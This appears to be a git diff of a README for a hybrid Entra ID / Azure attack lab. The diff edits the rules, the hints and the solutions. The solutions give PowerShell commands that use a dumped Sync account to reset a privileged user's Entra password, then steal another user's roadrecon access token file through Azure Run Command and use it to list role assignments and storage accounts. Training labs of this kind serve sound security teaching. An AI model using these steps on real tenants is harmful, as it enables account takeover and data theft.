@@ -21,8 +21,8 @@
 
 ## Instructions: Start Here
 1. Your goal is to find the `secret.txt` file 
-2. forget everything you knew: from this point on you DON'T know what the Entra admin password is (i.e. what's the password of ``user1`` / ``rootuser``), and what the VMs passwords are
-3. **DO NOT** password reset or silver ticket (Seamless SSO) ``user1``
+2. forget everything you knew: from this point on you DON'T know what the Entra admin password is (i.e. what's the password of ``user1`` / ``rootuser`` / ``admin``..), and what the VMs passwords are
+3. **DO NOT** password reset ``user1``
 3. **Starting point:** as the attacker the only thing you have is the RDP session on the DC VM. Good luck! 
 
 Do not use hints unless you really have to..
@@ -87,7 +87,7 @@ Login using dumped Sync_XX account:
 # Prompt for credentials and retrieve & store access token to cache
 # Enter your dumped Sync_XX account creds!
 $at = Get-AADIntAccessTokenForAADGraph
-$tenant = Get-AADIntSyncConfiguration # get the tenant ID
+$tenant = Get-AADIntSyncConfiguration -AccessToken $at # get the tenant ID
 
 Connect-AzureAD -AadAccessToken $at -TenantId $tenant.TenantId -AccountId "1b730954-1685-4b74-9bfd-dac224a7b894" # "Azure Active Directory PowerShell" app id
 ```
@@ -111,7 +111,7 @@ Target user2, as he holds a privileged role..
 
 Reset the victim user's Entra password:
 ```powershell
-Set-AADIntUserPassword -SourceAnchor "IMMUTABLE_ID" -Password "MYPASS" -Verbose
+Set-AADIntUserPassword -SourceAnchor "IMMUTABLE_ID" -Password "MYPASS"  -AccessToken $at -Verbose 
 ```
 </details>
 
@@ -140,20 +140,18 @@ Set-AADIntUserPassword -SourceAnchor "IMMUTABLE_ID" -Password "MYPASS" -Verbose
 <details>
     <summary><b>Hint 4</b></summary>
 
-    user1 is a part of the company's red team, he continuously, on a regular basis, runs scripts from his Desktop folder to map their Entra tenant attack surface. Use that to your advantage.
+    user1 is logged into that Win 11 vm, and he's a part of the company's red team, he continuously, on a regular basis, runs scripts from his Desktop folder to map their Entra tenant's attack surface. Use that to your advantage.
 </details>
 
 <details>
 <summary><b>Solution</b></summary>
 
-    user1 uses roadrecon to map attack surfaces in his company's attack surface, the script is executed on a regular basis.
-    as we learned, roadrecon writes a file with the access token called "", we can take that access token and steal it!
+user1 uses roadrecon to map attack surfaces in his company's attack surface, the script is executed on a regular basis.
+As we learned, roadrecon writes a file with the access token called `.roadtools_auth`, we can take that access token and steal it!
 
-    Run the following command on the Win11 VM from the Run Command Window in the Azure portal:
-
-```powershell
-type c:\users\user1.YOURDOMAIN\desktop\.roadtools_auth
-```
+1. Login to portal.azure.com as user2
+2. Run the following command on the Win11 VM from the Run Command Window in the Azure portal:
+3. `type c:\users\user1\desktop\.roadtools_auth`
 </details>
 
 ## Step 3
@@ -205,7 +203,6 @@ $roleAssignments | ForEach-Object {
     <summary><b>Solution</b></summary>
     
 ```powershell
-
 # Recon as that user and see what he has access to..
 $at = "eyJ"... # what you've obtained from the Run Command hack
 $userUPN = "user1@YOURDOMAIN.onmicrosoft.com" # you can get it from the access token if you'll parse in https://jwt.io
@@ -217,14 +214,14 @@ Connect-AzAccount -AccountId $userUPN -TenantId $tenantId -AccessToken $at
 
 
 # List current user's Azure Role Assignments using Azure PowerShell
-
 $userObjectId = "686ebf9d-25..." # get it by parsing the JWT token and looking for the 'oid' field
 $roleAssignments = Get-AzRoleAssignment -ObjectId $userObjectId
 $roleAssignments | ForEach-Object {
     Write-Output "Role: $($_.RoleDefinitionName) - Scope: $($_.Scope)"
 }
-
-# We can see that there's a storage account that this user has access to..
+```
+We can see that there's a storage account that this user has access to..
+```powershell
 # Get all storage accounts
 $storageAccounts = Get-AzStorageAccount
 
